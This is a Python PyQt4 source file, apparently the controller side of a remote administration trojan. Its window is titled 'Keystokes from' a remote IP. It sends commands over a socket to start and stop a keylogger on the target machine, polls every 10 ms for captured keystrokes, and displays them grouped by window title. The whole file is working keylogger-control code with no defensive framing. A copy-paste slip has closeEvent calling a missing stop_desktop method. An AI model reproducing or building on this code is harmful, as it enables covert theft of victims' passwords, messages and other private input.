from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ast import literal_eval

from main_ui import Ui_Form

from libs.modechat import get

class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']

        self.setWindowTitle('Keystokes from - %s - Socket #%s' % (self.ipAddress, self.socket))

        self.stopKeyloggingButton.setVisible(False)

        self.startKeyloggingButton.clicked.connect(self.start_logging)
        self.stopKeyloggingButton.clicked.connect(self.stop_logging)
        self.alwaysTopButton.clicked.connect(self.always_top)

        self.last_title = ''

    def start_logging(self):
        data = get(self.sock, 'startKeylogger', 'keyloggerstart')
        if data == 'keyloggerStarted':
            # Create a QTimer
            self.timer = QTimer()
            self.timer.setSingleShot(False)
            self.timer.timeout.connect(self.set_logs)
            self.timer.start(10)

            self.stopKeyloggingButton.setVisible(True)
            self.startKeyloggingButton.setVisible(False)

    def set_logs(self):
        try:
            data = get(self.sock, 'getKeystokes', 'keystokes')
            result = literal_eval(data)
            for k in result:
                if k != self.last_title:
                    self.keystokesText.append('<br><p align=center><font color=lime>%s</font><p><br>' % k)
                self.keystokesText.moveCursor(QTextCursor.End)
                self.keystokesText.insertHtml(result[k])
                self.keystokesText.moveCursor(QTextCursor.End)
                self.last_title = k
        except AttributeError:
            pass

    def stop_logging(self):
        data = get(self.sock, 'stopKeylogger', 'keyloggerstop')
        self.stopKeyloggingButton.setVisible(False)
        self.startKeyloggingButton.setVisible(True)
        try:
            self.timer.stop()
        except AttributeError:
            pass

    def always_top(self):
        if self.alwaysTopButton.isChecked():
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()

    def closeEvent(self, event):
        try:
            self.stop_desktop()
        except AttributeError:
            pass
